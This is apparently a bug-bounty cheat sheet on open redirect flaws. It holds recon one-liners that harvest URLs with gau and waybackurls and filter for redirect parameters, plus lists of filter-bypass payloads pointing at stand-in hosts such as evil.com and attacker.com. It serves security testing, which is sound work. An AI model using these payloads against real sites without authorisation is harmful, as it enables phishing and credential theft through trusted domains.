## Notes on Open Redirect:

If you need better understanding on open redirection vulnerabilty read this awesome [blog](https://medium.com/bugbountywriteup/open-redirection-leads-to-a-bounty-d94029e11d17) by [@impratikdabhi](https://twitter.com/impratikdabhi). You can get more than 100 h1 open redirect reports from [here](https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPOPENREDIRECT.md).

### gf-pattern:
Get it [here](https://github.com/muhe7/gf-pattern).

### One-Liner:
```
▶ gau http://google.com -s  | head -n 5000 > google.txt; cat google.txt | sort -u | grep -a -i \=http > google_redirects.txt


▶ waybackulrs google.com | gf open-redirect | tee google.txt
```

### Payloads: 
[wordlist](https://github.com/muhe7/Payloads)

#### Payloads from h1 reports:
```
///bing.com/?www.domain.com/?category=interview&page=2
#/path///google.com
//evil.com/
/evil.com/
///evil.com
http://evil.com
%2Fgoogle.com
%2Fgoogle%252Ecom
/216.58.217.206/calendar
/blackfan.ru/..;/css
https:/%5cblackfan.ru/
/www.google.com/%2f%2e%2e
%09http:///zeit.co%40google.com
%5cblackfan.ru
http://%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88/PugOfConcept/nopuppies.jpg
/blackfan.ru/%2f../
http%3a%2f%2fevil.com%2f
/\google.com
////wordpress.com
@google.com
<>//google.com
///;@www.google.com
%40evil.com/
//;@inexistantdomain.com
//www.google.com/%2e%2e
/\/\malicious-site.com
/youtube.com/%2F..
//www.google.com/%2f%2e%2e
%09/blackfan.ru
http:///@attacker.com//localhost
https://evildomain.xx/EvilFile.xx
//////////////////////hackerone.com
?continue[to]=//google.com
#//google.com/
example.com
```

#### Payloads from Twitter:
```
@%E2%80%AE@moc.elgoog
https://testurl.comPayload
https://testurl.com@%E2..
["http://Phishing.com"]
https://company[.]com.evil[.]org
website.com@google.com
www.targetweb.com.attackersite.com 
```

#### Effective Bypass:
```
▶ Use different TLD
company.net
company.com
company.xyz
```

#### Weird:
1. https://hackerone.com/reports/299403
2. https://hackerone.com/reports/140447





